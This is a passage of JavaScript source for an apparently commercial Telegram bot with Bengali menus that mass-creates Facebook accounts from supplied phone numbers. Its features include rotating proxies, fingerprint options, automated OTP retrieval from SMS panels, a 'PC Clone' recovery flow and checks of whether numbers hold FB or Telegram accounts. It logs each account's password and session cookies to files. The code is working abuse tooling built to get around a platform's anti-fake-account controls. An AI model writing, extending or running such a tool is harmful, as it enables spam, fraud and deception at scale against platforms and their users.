      return [];
    }
  }

  function writeUserProxies(uid, list) {
    const files = getUserFiles(uid);
    const unique = Array.from(new Set(list.map((l) => validateProxyUrl(l) || '').filter(Boolean)));
    fs.writeFileSync(files.proxies, unique.join('\n') + (unique.length ? '\n' : ''), 'utf-8');
  }

  function readUserPending(uid) {
    const files = getUserFiles(uid);
    try {
      if (!fs.existsSync(files.pending)) return [];
      const parsed = JSON.parse(fs.readFileSync(files.pending, 'utf-8'));
      if (!Array.isArray(parsed)) return [];
      const clean = parsed.filter(
        (p) => !(p && /\/reg\/submit\//i.test(p.confirm_url || '') && !p.action && !p.uid)
      );
      if (clean.length !== parsed.length) {
        fs.writeFileSync(files.pending, JSON.stringify(clean, null, 2), 'utf-8');
      }
      return clean;
    } catch {
      return [];
    }
  }

  function writeUserPending(uid, items) {
    const files = getUserFiles(uid);
    const sanitized = (Array.isArray(items) ? items : []).map((p) => {
      if (!p || typeof p !== 'object') return p;
      const copy = { ...p };
      delete copy._lastConfirmHtml;
      return copy;
    });
    fs.writeFileSync(files.pending, JSON.stringify(sanitized, null, 2), 'utf-8');
  }

  function pushUserPending(uid, item) {
    const items = readUserPending(uid);
    if (items.some((p) => p.phone === item.phone)) return;
    items.push({ ...item, createdAt: item.createdAt || Date.now() });
    writeUserPending(uid, items);
  }

  function upsertUserPending(uid, item) {
    if (!item || !item.phone) return;
    const items = readUserPending(uid);
    const idx = items.findIndex((p) => p.phone === item.phone);
    if (idx >= 0) {
      items[idx] = { ...items[idx], ...item, createdAt: items[idx].createdAt || item.createdAt || Date.now() };
    } else {
      items.push({ ...item, createdAt: item.createdAt || Date.now() });
    }
    writeUserPending(uid, items);
  }

  function readUserDone(uid) {
    const files = getUserFiles(uid);
    try {
      if (!fs.existsSync(files.done)) return new Set();
      return new Set(fs.readFileSync(files.done, 'utf-8').split(/\r?\n/).map((l) => l.trim()).filter(Boolean));
    } catch {
      return new Set();
    }
  }

  function markUserDone(uid, phone) {
    const files = getUserFiles(uid);
    fs.appendFileSync(files.done, phone + '\n', 'utf-8');
  }

  function clearUserDone(uid) {
    const files = getUserFiles(uid);
    fs.writeFileSync(files.done, '', 'utf-8');
  }

  function readUserAccounts(uid) {
    const files = getUserFiles(uid);
    try {
      if (!fs.existsSync(files.accountsJsonl)) return [];
      return fs
        .readFileSync(files.accountsJsonl, 'utf-8')
        .split(/\r?\n/)
        .filter(Boolean)
        .map((l) => {
          try {
            return JSON.parse(l);
          } catch {
            return null;
          }
        })
        .filter(Boolean)
        .reverse();
    } catch {
      return [];
    }
  }

  function clearUserAccounts(uid) {
    const files = getUserFiles(uid);
    fs.writeFileSync(files.accountsJsonl, '', 'utf-8');
    fs.writeFileSync(files.accountsTxt, '', 'utf-8');
    fs.writeFileSync(files.successTxt, '', 'utf-8');
  }

  function storeUserAccount(uid, rec) {
    const files = getUserFiles(uid);
    const pid = rec.printer || printerId();
    const cookies = orderCookies(rec.cookies || {});
    const cstr = formatCookieHeader(cookies) || '-';
    const stamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
    const txtBlock =
      `\n===== ${stamp} =====\n` +
      `NAME    : ${rec.name}\n` +
      `NUMBER  : +${rec.phone}\n` +
      `PASSWORD: ${rec.pass}\n` +
      `UID     : ${rec.uid || ''}\n` +
      `STATUS  : ${rec.status}\n` +
      `PRINTER : ${pid}\n` +
      (rec.engine ? `ENGINE  : ${rec.engine}\n` : '') +
      `COOKIE  : ${cstr}\n` +
      (rec.err ? `ERR     : ${rec.err}\n` : '');
    fs.appendFileSync(files.accountsTxt, txtBlock, 'utf-8');

    const obj = {
      ts: Math.floor(Date.now() / 1000),
      name: rec.name,
      number: rec.phone,
      password: rec.pass,
      uid: rec.uid || '',
      status: rec.status,
      confirmed: Boolean(rec.confirmed),
      printer: pid,
      engine: rec.engine || '',
      cookies,
      err: rec.err || '',
    };
    fs.appendFileSync(files.accountsJsonl, JSON.stringify(obj) + '\n', 'utf-8');

    if (rec.status === 'OK' && rec.uid && rec.pass) {
      let exists = false;
      try {
        if (fs.existsSync(files.successTxt)) {
          exists = fs.readFileSync(files.successTxt, 'utf-8').split(/\r?\n/).some((l) => l.split('|', 1)[0].trim() === rec.uid);
        }
      } catch {
        exists = false;
      }
      if (!exists) fs.appendFileSync(files.successTxt, `${rec.uid}|${rec.pass}\n`, 'utf-8');
    }
  }

  let tgRateLimitUntil = 0;
  const lastChatEditAt = new Map();

  async function tgCurlPostJson(url, bodyStr, timeoutMs, signal) {
    const maxSec = Math.max(5, Math.ceil(timeoutMs / 1000));
    return await new Promise((resolve, reject) => {
      const args = [
        '-sS',
        '--http1.1',
        '--connect-timeout',
        '6',
        '--max-time',
        String(maxSec),
        '-H',
        'Content-Type: application/json',
        '--data-binary',
        '@- ',
        url,
      ];
      args[args.length - 2] = '@-';
      const child = spawn('curl', args, { shell: false });
      const outChunks = [];
      const errChunks = [];
      const onAbort = () => {
        try { child.kill('SIGKILL'); } catch { /* ignore */ }
      };
      if (signal) {
        if (signal.aborted) {
          onAbort();
          return reject(new Error('Aborted'));
        }
        signal.addEventListener('abort', onAbort, { once: true });
      }
      child.stdout.on('data', (c) => outChunks.push(c));
      child.stderr.on('data', (c) => errChunks.push(c));
      child.on('error', (err) => {
        if (signal) signal.removeEventListener('abort', onAbort);
        reject(err);
      });
      child.on('close', (code) => {
        if (signal) signal.removeEventListener('abort', onAbort);
        const raw = Buffer.concat(outChunks).toString('utf-8').trim();
        if (raw) {
          try {
            return resolve(JSON.parse(raw));
          } catch {
            // fall through
          }
        }
        const errMsg = Buffer.concat(errChunks).toString('utf-8').trim();
        reject(new Error(errMsg || `curl exit ${code}`));
      });
      child.stdin.write(bodyStr);
      child.stdin.end();
    });
  }

  async function tgCall(method, payload = {}, signal, opts = {}) {
    const url = `https://api.telegram.org/bot${botToken}/${method}`;
    const bodyStr = JSON.stringify(payload);
    const timeoutMs = method === 'getUpdates' ? 40000 : 18000;
    const maxAttempts = opts.noRetry || method === 'getUpdates' || method === 'answerCallbackQuery' ? 1 : 2;

    if (opts.noRetry && tgRateLimitUntil > Date.now()) {
      return { ok: false, error_code: 429, description: 'Rate-limit cooldown active' };
    }

    for (let attempt = 0; attempt < maxAttempts; attempt++) {
      try {
        let data;
        try {
          data = await tgCurlPostJson(url, bodyStr, timeoutMs, signal);
        } catch (curlErr) {
          if (curlErr && curlErr.code === 'ENOENT') {
            const reqSignal = signal || AbortSignal.timeout(timeoutMs);
            const res = await fetch(url, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: bodyStr,
              signal: reqSignal,
            });
            data = await res.json();
          } else {
            throw curlErr;
          }
        }

        if (!data.ok && data.error_code === 429) {
          const retryAfter = Number(data?.parameters?.retry_after || 15);
          tgRateLimitUntil = Math.max(tgRateLimitUntil, Date.now() + (retryAfter + 1) * 1000);
          if (!opts.noRetry && attempt + 1 < maxAttempts && retryAfter <= 12) {
            await new Promise((r) => setTimeout(r, (retryAfter + 1) * 1000));
            continue;
          }
        }
        return data;
      } catch (err) {
        if (attempt + 1 >= maxAttempts) {
          return { ok: false, description: err instanceof Error ? err.message : 'Network error' };
        }
        await new Promise((r) => setTimeout(r, 1200 * (attempt + 1)));
      }
    }
    return { ok: false, description: 'Max retries exceeded' };
  }

  const btnOk = (text, callback_data) => ({ text, callback_data, style: 'success' });
  const btnBad = (text, callback_data) => ({ text, callback_data, style: 'danger' });
  const btnNav = (text, callback_data) => ({ text, callback_data, style: 'primary' });
  const btnUrl = (text, url, style = 'primary') => ({ text, url, style });

  function stripMarkupStyles(replyMarkup) {
    if (!replyMarkup) return undefined;
    if (Array.isArray(replyMarkup.inline_keyboard)) {
      return {
        ...replyMarkup,
        inline_keyboard: replyMarkup.inline_keyboard.map((row) =>
          row.map((btn) => {
            const copy = { ...btn };
            delete copy.style;
            return copy;
          })
        ),
      };
    }
    return replyMarkup;
  }

  function renderProgressBar(done, total, width = 10) {
    const safeTotal = Math.max(1, Number(total) || 1);
    const ratio = Math.max(0, Math.min(1, (Number(done) || 0) / safeTotal));
    const filled = Math.round(ratio * width);
    const pct = Math.round(ratio * 100);
    return `${'█'.repeat(filled)}${'░'.repeat(width - filled)} ${pct}%`;
  }

  function formatDuration(sec) {
    const s = Math.max(0, Math.floor(Number(sec) || 0));
    const h = Math.floor(s / 3600);
    const m = Math.floor((s % 3600) / 60);
    const r = s % 60;
    if (h > 0) return `${h}h ${m}m ${r}s`;
    if (m > 0) return `${m}m ${r}s`;
    return `${r}s`;
  }

  const DIVIDER = `━━━━━━━━━━━━━━━━━━━━`;

  function isHtmlParseError(res) {
    const desc = String(res?.description || '').toLowerCase();
    return Number(res?.error_code) === 400 && (desc.includes('parse') || desc.includes('entity') || desc.includes('tag') || desc.includes('unsupported'));
  }

  async function sendMessage(chatId, text, replyMarkup, opts = {}) {
    const body = text.length > 4000 ? text.slice(0, 3990) + '...' : text;
    let activeMarkup = replyMarkup;
    let res = await tgCall('sendMessage', {
      chat_id: chatId,
      text: body,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...(activeMarkup ? { reply_markup: activeMarkup } : {}),
    }, undefined, opts);
    if (!res.ok && String(res.description || '').toLowerCase().includes('style') && activeMarkup) {
      activeMarkup = stripMarkupStyles(activeMarkup);
      res = await tgCall('sendMessage', {
        chat_id: chatId,
        text: body,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: activeMarkup,
      }, undefined, opts);
    }
    if (!res.ok && isHtmlParseError(res)) {
      pushBotLog(`[TG-SEND-HTML-FALLBACK] chatId ${chatId}: ${res.description || 'failed'}`);
      res = await tgCall('sendMessage', {
        chat_id: chatId,
        text: body.replace(/<[^>]+>/g, ''),
        disable_web_page_preview: true,
        ...(activeMarkup ? { reply_markup: stripMarkupStyles(activeMarkup) } : {}),
      }, undefined, opts);
    }
    if (!res.ok && res.error_code !== 429) {
      pushBotLog(`[TG-SEND-FAILED] chatId ${chatId}: ${res.description || 'unknown'}`);
    }
    return res;
  }

  async function editMessage(chatId, messageId, text, replyMarkup, opts = {}) {
    if (opts.throttle) {
      if (tgRateLimitUntil > Date.now()) return { ok: true, skipped: true };
      const now = Date.now();
      const prev = lastChatEditAt.get(String(chatId)) || 0;
      if (now - prev < (opts.minIntervalMs || 2500)) return { ok: true, skipped: true };
      lastChatEditAt.set(String(chatId), now);
    }
    const body = text.length > 4000 ? text.slice(0, 3990) + '...' : text;
    let activeMarkup = replyMarkup;
    let res = await tgCall('editMessageText', {
      chat_id: chatId,
      message_id: messageId,
      text: body,
      parse_mode: 'HTML',
      disable_web_page_preview: true,
      ...(activeMarkup ? { reply_markup: activeMarkup } : {}),
    }, undefined, opts);
    if (!res.ok && String(res.description || '').toLowerCase().includes('style') && activeMarkup) {
      activeMarkup = stripMarkupStyles(activeMarkup);
      res = await tgCall('editMessageText', {
        chat_id: chatId,
        message_id: messageId,
        text: body,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        reply_markup: activeMarkup,
      }, undefined, opts);
    }
    if (!res.ok && isHtmlParseError(res)) {
      res = await tgCall('editMessageText', {
        chat_id: chatId,
        message_id: messageId,
        text: body.replace(/<[^>]+>/g, ''),
        disable_web_page_preview: true,
        ...(activeMarkup ? { reply_markup: stripMarkupStyles(activeMarkup) } : {}),
      }, undefined, opts);
    }
    if (!res.ok && String(res.description || '').includes('message is not modified')) {
      return { ok: true };
    }
    if (!res.ok && res.error_code !== 429 && !opts.noRetry) {
      pushBotLog(`[TG-EDIT-FAILED] msg ${messageId}: ${res.description || 'unknown'}`);
    }
    return res;
  }

  async function sendDocumentText(chatId, filename, content, caption = '') {
    const safeName = String(filename || 'export.txt').replace(/[^a-zA-Z0-9._-]/g, '_');
    const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
    try {
      const okCurl = await new Promise((resolve) => {
        const args = [
          '-sS',
          '--http1.1',
          '--connect-timeout',
          '6',
          '--max-time',
          '25',
          '-F',
          `chat_id=${String(chatId)}`,
          ...(caption ? ['-F', `caption=${String(caption).slice(0, 900)}`] : []),
          '-F',
          `document=@-;filename=${safeName};type=text/plain`,
          url,
        ];
        const child = spawn('curl', args, { shell: false });
        const chunks = [];
        child.stdout.on('data', (c) => chunks.push(c));
        child.on('error', () => resolve(null));
        child.on('close', () => {
          try {
            const parsed = JSON.parse(Buffer.concat(chunks).toString('utf-8').trim() || '{}');
            resolve(parsed);
          } catch {
            resolve({ ok: false });
          }
        });
        child.stdin.write(String(content ?? ''));
        child.stdin.end();
      });
      if (okCurl !== null) return okCurl;
    } catch {
      // fall through to fetch
    }
    try {
      const form = new FormData();
      form.append('chat_id', String(chatId));
      if (caption) form.append('caption', String(caption).slice(0, 900));
      form.append('document', new Blob([String(content ?? '')], { type: 'text/plain;charset=utf-8' }), safeName);
      const r = await fetch(url, { method: 'POST', body: form, signal: AbortSignal.timeout(25000) });
      return await r.json();
    } catch (err) {
      return { ok: false, description: err instanceof Error ? err.message : 'sendDocument failed' };
    }
  }

  async function tgDownloadFileBuffer(filePath) {
    const url = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
    try {
      return await new Promise((resolve, reject) => {
        const args = ['-sS', '--http1.1', '--connect-timeout', '6', '--max-time', '35', url];
        const child = spawn('curl', args, { shell: false });
        const chunks = [];
        const errChunks = [];
        child.stdout.on('data', (c) => chunks.push(c));
        child.stderr.on('data', (c) => errChunks.push(c));
        child.on('error', (err) => reject(err));
        child.on('close', (code) => {
          if (code === 0) resolve(Buffer.concat(chunks));
          else reject(new Error(Buffer.concat(errChunks).toString('utf-8').trim() || `curl exit ${code}`));
        });
      });
    } catch (err) {
      if (err && err.code === 'ENOENT') {
        const resp = await fetch(url, { signal: AbortSignal.timeout(30000) });
        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
        return Buffer.from(await resp.arrayBuffer());
      }
      throw err;
    }
  }

  async function tgDownloadFileText(filePath) {
    const buf = await tgDownloadFileBuffer(filePath);
    return buf.toString('utf-8');
  }

  async function checkChannelMembership(uid, st) {
    if (!st.requireChannelJoin) return { ok: true };
    const handle = getChannelHandle(st.channelUrl);
    if (!handle || !handle.startsWith('@')) return { ok: true };
    const cacheKey = `${uid}:${handle}`;
    const cached = channelMemberCache.get(cacheKey);
    if (cached && Date.now() - cached.ts < 60000) {
      return cached.val;
    }
    const res = await tgCall('getChatMember', { chat_id: handle, user_id: Number(uid) || uid });
    if (!res.ok || !res.result) {
      // Fail-open if bot is not yet admin in the channel so users are not soft-locked
      const failOpen = { ok: true, warning: res.description || 'Cannot query channel membership' };
      channelMemberCache.set(cacheKey, { ts: Date.now(), val: failOpen });
      return failOpen;
    }
    const status = String(res.result.status || '').toLowerCase();
    const joined = ['member', 'administrator', 'creator', 'restricted'].includes(status);
    const out = { ok: joined, status };
    if (joined) channelMemberCache.set(cacheKey, { ts: Date.now(), val: out });
    return out;
  }

  function buildMainMenuKb(uid, isAdmin, stInput) {
    const pendingCnt = readUserPending(uid).length;
    const accCnt = readUserAccounts(uid).filter((a) => a.status === 'OK').length;
    const proxyCnt = readUserProxies(uid).length;
    const run = activeRuns.get(uid);
    const rows = [
      [
        btnOk('⚡ FB Auto create', 'menu:fb_auto_create'),
        btnOk('🛠 FB Tools', 'menu:fb_tools'),
      ],
      [
        btnOk('💻 PC Clone (রিকভারি)', 'menu:pc_clone'),
        btnOk('🚀 নাম্বার দিয়ে তৈরি', 'menu:run'),
      ],
      [
        btnOk('🔍 Number Check', 'menu:number_check'),
        pendingCnt > 0 ? btnOk(`🔐 পেন্ডিং OTP (${pendingCnt})`, 'menu:otp') : btnNav(`🔐 পেন্ডিং OTP (${pendingCnt})`, 'menu:otp'),
      ],
      [
        btnNav(`📦 অ্যাকাউন্টস (${accCnt})`, 'menu:accounts'),
        btnNav(`🌐 প্রক্সি (${proxyCnt})`, 'menu:proxies'),
      ],
      [
        btnNav('⚙️ সেটিংস ও পাসওয়ার্ড', 'menu:settings'),
        btnNav('🍪 কুকিজ সেটিং', 'menu:cookie'),
      ],
      [
        btnBad('🧼 কুকি ও ক্যাশ ক্লিন', 'cookies:fresh_all'),
        btnNav('📊 কাজের হিসাব', 'menu:stats'),
      ],
      [
        btnOk('💬 Support', 'menu:support'),
        btnNav('🩺 সার্ভার টেস্ট', 'menu:diagnose'),
      ],
      [
        btnNav('📜 কাজের রিপোর্ট', 'menu:logs'),
        btnNav('❓ ব্যবহারের নিয়ম', 'menu:help'),
      ],
    ];
    if (run?.running) rows.push([btnBad('🛑 চলমান কাজ বন্ধ করুন', 'menu:stop')]);
    if (isAdmin) rows.push([btnOk('👑 Admin Panel', 'admin:home')]);
    rows.push([btnOk('🔄 পেজ রিফ্রেশ করুন', 'menu:home')]);
    return { inline_keyboard: rows };
  }

  function buildHomeText(user, cfg, st) {
    const pendingCnt = readUserPending(user.id).length;
    const readyCnt = readUserAccounts(user.id).filter((a) => a.status === 'OK').length;
    const proxyList = readUserProxies(user.id);
    const proxyCnt = proxyList.length;
    const doneCnt = readUserDone(user.id).size;
    const run = activeRuns.get(user.id);
    const activeTotal = Array.from(activeRuns.values()).filter((r) => r?.running).length;
    const pwBadge = cfg.password ? `🟢 সেট করা (${cfg.password.length} অক্ষর)` : `🔴 সেট করা নেই`;
    const runnerBadge = run?.running
      ? `🟢 চলছে (${run.completed}/${run.total})`
      : `⚪ বন্ধ আছে`;
    const quotaBar = renderProgressBar(user.usedToday, user.dailyLimit, 8);
    const [countryName] = getCountryInfo(cfg.cc);
    const engineLabel = (cfg.engine_mode || 'hybrid').toUpperCase();
    const pxModeLabel = (cfg.proxy_mode || 'rotate').toUpperCase();
    const brand = st.brandName || DEFAULT_BRAND_NAME;
    const totalPxBytes = proxyTrafficStats.txBytes + proxyTrafficStats.rxBytes;

    return [
      `💎 <b>${escapeHtml(brand)} PRO • মেইন কন্ট্রোল প্যানেল</b>`,
      DIVIDER,
      `👤 <b>ইউজার:</b> ${escapeHtml(user.firstName)} (<code>${escapeHtml(user.id)}</code>)  •  🛡 <b>স্ট্যাটাস:</b> ${isUserAdmin(user, st) ? '👑 ADMIN' : '✅ APPROVED'}`,
      `🎯 <b>আজকের লিমিট:</b> <code>${user.usedToday}/${user.dailyLimit}</code> [<code>${quotaBar}</code>]`,
      ``,
      `⚙️ <b>বর্তমান সেটিংস</b>`,
      `├ 🌍 ডিফল্ট কোড: <code>+${escapeHtml(cfg.cc)}</code> (${escapeHtml(countryName)})  •  🔑 পাসওয়ার্ড: ${pwBadge}`,
      `├ 🚀 ইঞ্জিন: <code>${escapeHtml(engineLabel)}</code>  •  🔍 GQL চেক: ${cfg.precheck_gql !== false ? (cfg.gql_via_direct !== false ? '⚡ DIRECT' : '🌐 PROXY') : '🔴 OFF'}`,
      `├ 💻 PC OTP: <code>${cfg.pc_otp_resends ?? 3}x</code>  •  📡 অটো OTP সার্ভার: ${(resolveFbToolsLamixToken() || resolveFbTools2oo9Keys().length > 0 || readPanelsStore().panels.some((p) => p.active !== false)) ? '🟢 ON' : '⚪ OFF'}  •  ⚡ স্পিড: <code>${cfg.threads ?? 4}x</code>`,
      `└ 🌐 প্রক্সি: <code>${proxyCnt}</code>টি (<code>${escapeHtml(pxModeLabel)}</code>)  •  💾 সেভার: ${cfg.proxy_saver !== false ? '🟢 ON' : '🔴 OFF'}${totalPxBytes > 0 ? ` (${formatBytes(totalPxBytes)})` : ''}`,
      ``,
      `📊 <b>আপনার অ্যাকাউন্ট ও কাজের অবস্থা</b>`,
      `├ ✅ রেডি আইডি: <code>${readyCnt}</code>  •  🔐 পেন্ডিং OTP: <code>${pendingCnt}</code>  •  ✔️ সম্পন্ন: <code>${doneCnt}</code>`,
      `└ ⚡ কাজের অবস্থা: <b>${runnerBadge}</b>${activeTotal > 0 ? `  •  👥 সক্রিয় ইউজার: <code>${activeTotal}</code>` : ''}`,
      ``,
      `💡 <i>সহজ গাইড:</i>`,
      `• <b>⚡ FB Auto create</b> — অ্যাডমিনের পুল নাম্বার দিয়ে অটো অ্যাকাউন্ট + অটো OTP`,
      `• <b>🛠 FB Tools</b> — LOL অটো ক্রিয়েটর (রেঞ্জ সিলেক্ট, হার্ডওয়্যার FP ও লাইভ Multi-OTP)`,
      `• <b>🔍 Number Check</b> — নাম্বারে FB বা Telegram খোলা আছে কিনা চেক করুন`,
      ``,
      `<blockquote>💬 ${escapeHtml(st.welcomeNote)}</blockquote>`,
    ].join('\n');
  }

  async function renderHome(chatId, tgUser, editMsgId) {
    const st = readSettings();
    const user = getOrCreateUser(tgUser);
    const isAdmin = isUserAdmin(user, st);

    if (st.maintenanceMode && !isAdmin) {
      const maintText = [
        `🛠 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • MAINTENANCE MODE</b>`,
        DIVIDER,
        `The bot is currently undergoing scheduled maintenance by the administrator.`,
        `Please check our official channel for live updates.`,
        ``,
        `👑 <b>Owner:</b> ${escapeHtml(st.adminUsername)}`,
        `📢 <b>Channel:</b> ${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}`,
      ].join('\n');
      const maintKb = {
        inline_keyboard: [
          [
            btnUrl('📢 Channel Updates', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
            btnUrl('👑 Contact Owner', st.ownerUrl || DEFAULT_OWNER_URL, 'success'),
          ],
          [btnOk('🔄 Check Status', 'menu:home')],
        ],
      };
      if (editMsgId) await editMessage(chatId, editMsgId, maintText, maintKb);
      else await sendMessage(chatId, maintText, maintKb);
      return;
    }

    if (user.status === 'blocked') {
      const blockedText = [
        `🚫 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • ACCESS RESTRICTED</b>`,
        DIVIDER,
        `Your Telegram account (<code>${escapeHtml(user.id)}</code>) is currently blocked.`,
        ``,
        `<blockquote>📩 Contact Owner: ${escapeHtml(st.adminUsername)}</blockquote>`,
      ].join('\n');
      const blkKb = {
        inline_keyboard: [
          [
            btnUrl('👑 Contact Owner', st.ownerUrl || DEFAULT_OWNER_URL, 'danger'),
            btnUrl('📢 Channel', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
          ],
        ],
      };
      if (editMsgId) await editMessage(chatId, editMsgId, blockedText, blkKb);
      else await sendMessage(chatId, blockedText, blkKb);
      return;
    }

    if (!isAdmin && st.requireChannelJoin) {
      const ch = await checkChannelMembership(user.id, st);
      if (!ch.ok) {
        const joinText = [
          `📢 <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • CHANNEL VERIFICATION</b>`,
          DIVIDER,
          `To use <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} Bot</b>, please join our official Telegram channel first:`,
          ``,
          `🔗 <b>Channel:</b> ${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}`,
          `👑 <b>Owner:</b> ${escapeHtml(st.adminUsername)}`,
        ].join('\n');
        const joinKb = {
          inline_keyboard: [
            [btnUrl('📢 Join Official Channel', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary')],
            [btnOk('✅ I Joined • Verify Now', 'menu:home')],
          ],
        };
        if (editMsgId) await editMessage(chatId, editMsgId, joinText, joinKb);
        else await sendMessage(chatId, joinText, joinKb);
        return;
      }
    }

    if (user.status !== 'approved' && !isAdmin) {
      const waitText = [
        `⏳ <b>${escapeHtml(st.brandName || DEFAULT_BRAND_NAME)} • APPROVAL REQUIRED</b>`,
        DIVIDER,
        `🆔 <b>Telegram ID:</b> <code>${escapeHtml(user.id)}</code>`,
        `📌 <b>Status:</b> 🟡 Pending Admin Verification`,
        `👑 <b>Owner Contact:</b> ${escapeHtml(st.adminUsername)}`,
        `📢 <b>Channel:</b> ${escapeHtml(st.channelUrl || DEFAULT_CHANNEL_URL)}`,
        ``,
        `<blockquote>🔔 The administrator has been notified. Tap <b>Check Approval</b> below once your access is granted.</blockquote>`,
      ].join('\n');
      const kb = {
        inline_keyboard: [
          [btnOk('🔄 Check Approval Status', 'menu:home')],
          [
            btnUrl('📢 Official Channel', st.channelUrl || DEFAULT_CHANNEL_URL, 'primary'),
            btnUrl('👑 Contact Owner', st.ownerUrl || DEFAULT_OWNER_URL, 'success'),
          ],
        ],
      };
      if (editMsgId) {
        await editMessage(chatId, editMsgId, waitText, kb);
      } else {
        await sendMessage(chatId, waitText, kb);
        pushBotLog(`New pending user request: ${user.id} (@${user.username || 'none'})`);
        await sendMessage(
          st.adminId,
          [
            `🔔 <b>NEW BOT ACCESS REQUEST</b>`,
            DIVIDER,
            `👤 <b>Name:</b> ${escapeHtml(user.firstName)}`,
            `🔗 <b>Username:</b> @${escapeHtml(user.username || 'none')}`,
            `🆔 <b>User ID:</b> <code>${escapeHtml(user.id)}</code>`,
          ].join('\n'),
          {
            inline_keyboard: [
              [
                btnOk('✅ Approve User', `admin:approve:${user.id}`),
                btnBad('🚫 Block User', `admin:block:${user.id}`),
              ],
            ],
          }
        );
      }
      return;
    }

    const cfg = readUserConfig(user.id);
    const text = buildHomeText(user, cfg, st);
    const kb = buildMainMenuKb(user.id, isAdmin, st);
    if (editMsgId) await editMessage(chatId, editMsgId, text, kb);
    else await sendMessage(chatId, text, kb);
  }

  async function renderRunPrompt(chatId, uid, editMsgId) {
    const cfg = readUserConfig(uid);
    const doneCnt = readUserDone(uid).size;
    const [countryName] = getCountryInfo(cfg.cc);
    promptSessions.set(uid, { kind: 'awaiting_numbers' });
    const pwWarn = !cfg.password || cfg.password.length < 6
      ? `\n<blockquote>⚠️ <b>পাসওয়ার্ড সেট করা নেই!</b> কাজ শুরু করার আগে নিচের <b>পাসওয়ার্ড সেট করুন</b> বাটনে চাপুন।</blockquote>`
      : '';
    const txt = [
      `🚀 <b>নাম্বার দিয়ে অ্যাকাউন্ট তৈরি (MANUAL BATCH)</b>`,
      DIVIDER,
      `আপনার নিজের দেওয়া ফোন নাম্বারগুলো দিয়ে একসাথে অনেকগুলো FB অ্যাকাউন্ট তৈরি করুন:`,
      `🌍 <b>ডিফল্ট কোড:</b> <code>+${escapeHtml(cfg.cc)}</code> (${escapeHtml(countryName)})`,
      `🚀 <b>ইঞ্জিন:</b> <code>${escapeHtml((cfg.engine_mode || 'hybrid').toUpperCase())}</code>  •  🔍 <b>GQL চেক:</b> ${cfg.precheck_gql !== false ? '🟢 চালু' : '🔴 বন্ধ'}`,
      `🔄 <b>পুরনো নাম্বার বাদ দিন (Resume):</b> ${cfg.resume_mode !== false ? '🟢 চালু' : '🔴 বন্ধ'} (<code>${doneCnt}</code>টি সেভ আছে)`,
      `⚙️ <b>স্পিড:</b> Threads <code>${cfg.threads ?? 4}x</code> • Retries <code>${cfg.retries}</code> • Delay <code>${cfg.delay ?? 1}s</code> • Proxy <code>${escapeHtml((cfg.proxy_mode || 'rotate').toUpperCase())}</code>`,
      pwWarn,
      ``,
      `<blockquote>📥 নিচে ফোন নাম্বারগুলো পেস্ট করুন (প্রতি লাইনে ১টি) অথবা <code>.txt</code> / <code>.csv</code> ফাইল আপলোড করুন।</blockquote>`,
    ].filter(Boolean).join('\n');
    const kb = {
      inline_keyboard: [
        ...(!cfg.password || cfg.password.length < 6 ? [[btnOk('🔑 পাসওয়ার্ড সেট করুন', 'set:pw')]] : []),
        [
          btnOk('⚡ সুপার ফাস্ট (0s • 6x)', 'run:turbo'),
          btnNav(`⚡ স্পিড (${cfg.threads ?? 4}x)`, 'run:cycle_threads'),
        ],
        [
          cfg.precheck_gql !== false
            ? btnOk('🔍 GQL আগে চেক: চালু', 'run:toggle_gql')
            : btnBad('🔍 GQL আগে চেক: বন্ধ', 'run:toggle_gql'),
          cfg.resume_mode !== false
            ? btnOk('🔄 পুরনো বাদ দিন: চালু', 'run:toggle_resume')
            : btnBad('🔄 পুরনো বাদ দিন: বন্ধ', 'run:toggle_resume'),
        ],
        [
          btnBad(`🧹 পুরনো তালিকা মুছুন (${doneCnt})`, 'run:clear_done'),
          btnNav('🌐 প্রক্সি সেটআপ', 'menu:proxies'),
        ],
        [
          btnNav('⬅️ মেইন মেনু', 'menu:home'),
          btnBad('❌ বাতিল', 'prompt:cancel'),
        ],
      ],
    };
    if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
    else await sendMessage(chatId, txt, kb);
  }

  async function renderOtpQueue(chatId, uid, editMsgId) {
    const items = readUserPending(uid);
    if (items.length === 0) {
      const txt = [
        `🔐 <b>পেন্ডিং OTP তালিকা (OTP QUEUE)</b>`,
        DIVIDER,
        `<i>এখন কোনো নাম্বারে OTP কোডের অপেক্ষা নেই।</i>`,
        ``,
        `<blockquote>💡 অ্যাকাউন্ট তৈরির সময় যেসব নাম্বারে SMS কোড লাগে, সেগুলো এখানে জমা হয়। অটো বা ম্যানুয়ালি কোড দিয়ে ভেরিফাই করতে পারবেন।</blockquote>`,
      ].join('\n');
      const kb = {
        inline_keyboard: [
          [
            btnOk('➕ ম্যানুয়াল যোগ করুন', 'otp:manual'),
            btnNav('📡 প্যানেল OTP চেক', 'otp:panel_sync'),
            btnNav('📡 সার্ভার ২ OTP চেক', 'otp:lamix_sync'),
          ],
          [
            btnOk('🔄 রিফ্রেশ', 'menu:otp'),
            btnNav('⬅️ মেইন মেনু', 'menu:home'),
          ],
        ],
      };
      if (editMsgId) await editMessage(chatId, editMsgId, txt, kb);
      else await sendMessage(chatId, txt, kb);
      return;
    }

    const lines = [
      `🔐 <b>পেন্ডিং OTP তালিকা (${items.length}টি)</b>`,
      DIVIDER,
      `নিচের বাটনে চাপ দিয়ে হাতে OTP দিন অথবা <b>Resend</b> / <b>Check</b> করুন:`,
      ``,
    ];
    const rows = [];
    items.slice(0, 5).forEach((item, idx) => {
      const badge = item.flow === 'recovery' ? '💻' : item.status === 'CHECKPOINT' ? '🛡' : '📩';
